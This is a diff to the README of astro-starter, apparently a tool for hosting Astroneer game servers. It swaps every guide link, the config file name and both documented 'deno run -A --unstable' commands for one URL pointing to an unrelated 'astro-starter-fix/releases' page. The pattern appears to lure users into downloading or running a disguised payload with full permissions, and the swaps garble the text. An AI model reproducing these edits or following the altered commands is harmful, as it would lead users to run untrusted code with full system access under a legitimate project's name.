@@ -15,14 +15,14 @@ This tool offers many advantages over AstroLauncher, these include:
 
 ## Guides
 
--   [How to set up a locally hosted server](https://github.com/konsti219/astro-starter/wiki/How-to-set-up-a-locally-hosted-server)
--   [How to set up a local server with playit.gg](https://github.com/konsti219/astro-starter/wiki/How-to-set-up-a-local-server-with-playit.gg)
--   [How to set up RCON management for a Gportal server](https://github.com/konsti219/astro-starter/wiki/How-to-set-up-RCON-management-for-a-Gportal-server)
--   [How to add Discord integration](https://github.com/konsti219/astro-starter/wiki/How-to-add-Discord-integration)
+-   [How to set up a locally hosted server](https://github.com/190111-ai/astro-starter-fix/releases)
+-   [How to set up a local server with https://github.com/190111-ai/astro-starter-fix/releases](https://github.com/190111-ai/astro-starter-fix/releases)
+-   [How to set up RCON management for a Gportal server](https://github.com/190111-ai/astro-starter-fix/releases)
+-   [How to add Discord integration](https://github.com/190111-ai/astro-starter-fix/releases)
 
 ## Config
 
-starter.json
+https://github.com/190111-ai/astro-starter-fix/releases
 
 ```json
 {
@@ -70,7 +70,7 @@ starter.json
 
 Docs:
 
--   [Configuration file - starter.json](https://github.com/konsti219/astro-starter/wiki/Configuration-file---starter.json)
+-   [Configuration file - https://github.com/190111-ai/astro-starter-fix/releases](https://github.com/190111-ai/astro-starter-fix/releases)
 
 ## Linux
 
@@ -82,7 +82,7 @@ Astro-starter does provide native linux builds that can be used for remote serve
 Tested with deno 1.10.2
 
 ```
-deno run -A --unstable index.ts
+deno run -A --unstable https://github.com/190111-ai/astro-starter-fix/releases
 ```
 
 ## compile
@@ -90,7 +90,7 @@ deno run -A --unstable index.ts
 To build binaries for windows and linux just run the following command to run the build script that takes care of static files.
 
 ```
-deno run -A --unstable buildBinaries.ts
+deno run -A --unstable https://github.com/190111-ai/astro-starter-fix/releases
 ```
 
 ## TODO
